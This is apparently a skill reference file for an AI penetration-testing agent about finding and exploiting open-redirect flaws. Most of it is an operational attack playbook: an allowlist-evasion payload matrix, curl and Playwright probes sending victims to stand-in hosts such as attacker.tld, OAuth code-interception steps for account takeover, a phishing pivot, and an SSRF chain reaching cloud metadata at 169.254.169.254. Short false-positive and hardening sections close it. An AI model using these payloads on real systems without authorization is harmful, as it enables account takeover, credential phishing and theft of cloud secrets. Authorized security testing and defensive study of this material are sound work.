---
name: Open Redirect
description: Reference for testing open-redirect vulnerabilities covering allowlist evasion, parser differentials, OAuth code interception, server-side fetcher chaining, and multi-hop bypass.
---

# Open Redirect

Reference for finding and exploiting open redirects. Pull this in when you spot user-controlled redirect destinations (login flows, OAuth `redirect_uri`, password reset, link unfurlers, server-side fetchers) and need a payload matrix.

> Black-box scope: probes drive HTTP and observe browser navigation behavior. Server-side validation differentials versus real browser parsing are the core finding.

## Tool wiring

| Action | Tool | Notes |
|---|---|---|
| Issue redirect probes | `execute_curl` | `-i` to capture status + `Location:` header without following. |
| Confirm browser navigation | `execute_playwright` | Server may answer 302 but the address bar is what matters in chained attacks. |
| OAuth flow capture | `execute_playwright` | Record full redirect chain. |
| OOB callback for chained SSRF / unfurler exfil | `kali_shell interactsh-client` | Use as the attacker host. |

## Injection points

```
?redirect=          ?url=             ?next=              ?return_to=
?returnUrl=         ?continue=        ?goto=              ?target=
?callback=          ?out=             ?dest=              ?back=
?to=                ?r=               ?u=                 ?landing=
?go=                ?successUrl=      ?failureUrl=        ?ref=
```

OAuth / OIDC / SAML:

```
redirect_uri=                post_logout_redirect_uri=
RelayState=                  state=
```

Server-side / app:

```
Host: header                 X-Forwarded-Host:           X-Forwarded-Proto:
Referer:                     reflected Location echo
```

Client-side:

```
location.href / .assign / .replace
window.open
<meta http-equiv="refresh" content="0;url=...">
SPA router.push / router.replace
```

## Allowlist-evasion payload matrix

Match against an allowlist for `trusted.tld`:

| Class | Payload | Why it bypasses |
|---|---|---|
| Userinfo | `https://trusted.tld@evil.tld` | Allowlist parses host as `trusted.tld`, browser navigates to `evil.tld` |
| Userinfo + encoding | `https://trusted.tld%40evil.tld` | Same effect, different encoding pass |
| Double userinfo | `https://a%40evil.tld%40trusted.tld` | Some parsers split on first `@`, browsers on last |
| Backslash | `https://trusted.tld\evil.tld` | Browsers normalize `\` to `/` |
| Backslash + userinfo | `https://trusted.tld\@evil.tld` | Same as userinfo with backslash twist |
| Triple slash | `///evil.tld` | Schemeless, `//` defaults to current scheme; many validators normalize differently |
| Mixed slashes | `/\evil.tld` | Mixed separator parsed as host by browsers |
| Whitespace | `http%09://evil.tld` (TAB) | Some validators strip whitespace, some don't |
| Newline | `http%0A://evil.tld` | Same |
| Fragment | `https://trusted.tld#@evil.tld` | Validator parses fragment, browser does not for navigation host |
| Query-as-host | `https://trusted.tld?//@evil.tld` | Same as above |
| Punycode | `https://truﬆed.tld` (Latin small ligature st) | Looks like `trusted.tld` post-IDNA in some allowlists |
| IDN dot | `https://trusted.tld。evil.tld` (full-width dot) | IDN-normalized to `trusted.tld.evil.tld` |
| Trailing dot | `https://trusted.tld.evil.tld` | Substring "trusted.tld" matches but host is evil |
| Suffix match | `https://trusted.tld.evil.tld/` | Common when allowlist uses `endsWith` instead of exact |
| Wildcard abuse | `https://attacker.trusted.tld.evil.tld` | When allowlist is `*.trusted.tld` substring |
| Double encode | `%2f%2fevil.tld` | One decode -> `//evil.tld` |
| Triple encode | `%252f%252fevil.tld` | Same chain, more layers |
| Scheme case | `hTtPs://evil.tld` | Validators that lowercase before regex |
| Scheme implicit | `//evil.tld` | Protocol-relative, follows current scheme |
| Scheme alt | `data:text/html,<script>...</script>` | Scheme not pinned to http(s) |
| Scheme alt | `javascript:alert(1)` | Pre-`navigate()` checks may miss |
| IP variants | `http://2130706433/`, `http://0177.0.0.1/`, `http://0x7f.1/`, `http://[::ffff:127.0.0.1]/` | SSRF-friendly |
| User-controlled path base | `/out?url=/\evil.tld` | Server returns relative redirect; browser resolves to host |

### Captured-traffic workflow (proxy_brain tools)

If HTTP Traffic Capture is enabled, source and drive this from the recorded history (proxy_brain only see traffic that crossed the capture proxy).

- `redamon.params` surfaces captured redirect params (`next`, `url`, `redirect_uri`, `return_to`) and flags the injectable ones.
- `redamon.fuzz id "next" [...]` runs the allowlist-evasion matrix above over one captured redirect QUERY param, reading per-payload status and `Location` to spot the payloads that redirect off-host.
- `redamon.replay id mutate:{param:{"next":"https://trusted.tld@attacker.tld/cb"}}` mutates a single candidate and reads the resulting `Location`.
- `redamon.grep "attacker.tld"` confirms the input was reflected into a captured `Location`.

Caveat: proxy_brain prove the server emitted the redirect only. Address-bar confirmation (where the browser actually navigates) still needs `execute_playwright`.

## Probe templates

Single hop:

```
execute_curl url: "https://target.tld/login?next=https://attacker.tld/cb" headers: "Cookie: session=$VICTIM"
# look for: 302 + Location: https://attacker.tld/cb
```

Chained probe (ProxyHeader / Host poisoning):

```
execute_curl url: "https://target.tld/" headers: "Host: attacker.tld\nX-Forwarded-Host: attacker.tld"
# look for: password reset or signup links pointing at attacker.tld
```

Browser confirmation:

```
execute_playwright url: "https://target.tld/login?next=https://target.tld%40attacker.tld/cb" script: |
  page.goto("https://target.tld/login?next=https://target.tld%40attacker.tld/cb")
  print(page.url)
```

## Bypass-class lookup

| Server-side validator | Likely bypass |
|---|---|
| `startsWith("https://trusted.tld")` | `https://trusted.tld.evil.tld`, `https://trusted.tld@evil.tld` |
| `endsWith(".trusted.tld")` | `https://attacker.trusted.tld.evil.tld` (substring), `https://trusted.tld\@evil.tld` |
| `host.includes("trusted.tld")` | `https://attacker.trusted.tld.evil.tld` |
| Regex without `^...$` | Anywhere-substring matches |
| `URL().hostname == "trusted.tld"` | Userinfo bypass: `https://trusted.tld@evil.tld` |
| Path normalization not aligned with browser | `\`, `//`, `%2f%2f`, `%5c` |
| Scheme not pinned | `data:`, `javascript:`, `file:`, `gopher:` |
| First-hop only validation | Trusted redirect that hops to attacker on second response |

## Multi-hop chain

The most missed class. Validator confirms `Location: https://trusted.tld/r?to=...`, follows with the browser, and the trusted server then 302s to the attacker. Probe by:

```
execute_curl url: "https://target.tld/login?next=https://trusted.tld/r?to=https://attacker.tld" -L
# follow redirects, observe the final URL
```

Common second-hop targets: `/out?u=`, `/r?url=`, `/redirect`, `/track`, `/click`, marketing redirector services.

## Exploitation scenarios

### OAuth code interception

```
1. Attacker registers redirect on victim app to https://trusted.tld/r?to=https://attacker.tld/cb
2. Victim authorizes; IdP returns code to https://trusted.tld/r?code=...&to=https://attacker.tld/cb
3. trusted.tld redirects to attacker.tld with the code attached
4. Attacker exchanges code at the token endpoint -> ATO
```

For the surrounding flow probes (PKCE downgrade, `state` strip), see `/skill oauth_oidc`.

### Phishing pivot

Trusted-domain redirect with a clone login UI on attacker.tld -> credential capture. Browser address bar shows `target.tld` initially, then switches; Microsoft / Google brand domain in the link is the social trick.

### SSRF chain via link unfurlers

Many backends unfurl URLs (Slack-bot, link previewers, OpenGraph fetchers). They follow redirects.

```
execute_curl url: "https://api.target.tld/preview?url=https://trusted.tld/out?u=http://169.254.169.254/latest/meta-data/" -i
```

If the unfurler's response delays / contains EC2 metadata fragments, the chain is alive.

### Internal-only redirect to credential bypass

```
GET /internal-redirect?url=http://localhost:8000/admin
```

Some backends bind admin only on loopback; an internal-fetcher open redirect bypasses the network gate.

## Validation shape

A clean Open Redirect finding includes:

1. The exact URL (with payload).
2. The full HTTP response (status + Location header).
3. Browser confirmation: a `page.url` value pointing at the attacker host (Playwright screenshot or text dump).
4. For OAuth chains: the captured `code` / `state` query string in the attacker-side log.
5. For SSRF chains: the OOB callback proving cloud metadata (or other internal) was reached.

## False positives

- Validator + same-origin enforcement plus exact final-host comparison after canonicalization.
- Browser address bar shows the attacker URL only after a manual click on a confirm screen (intent UX is enforced).
- Pre-registered OAuth `redirect_uri` with strict equality and PKCE binding.
- Allowlist using a single canonical parser (WHATWG URL API server-side) and matching against post-IDNA hostname.

## Hardening summary

- Canonicalize with one parser (server-side WHATWG URL or equivalent), compare exact scheme + hostname (post-IDNA) against an allowlist of exact origins, optionally with path prefixes.
- Reject protocol-relative `//`, all schemes outside `https`, userinfo, and trailing dots.
- For OAuth, require `redirect_uri` exact match (no path prefix wildcards, no port wildcards).
- Validate every hop, not only the first. If your stack does not own the second hop, ban it.
- For server-side fetchers, deny `127.0.0.0/8`, `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `169.254.0.0/16`, IPv6 link-local, and metadata IPs after DNS resolution. Re-resolve at fetch time.

## Hand-off

```
OAuth code interception   -> /skill oauth_oidc
SSRF chain                -> built-in ssrf_exploitation skill
Cache poisoning via Host  -> /skill information_disclosure (cache section)
Reset poisoning           -> /skill information_disclosure (host header section)
```
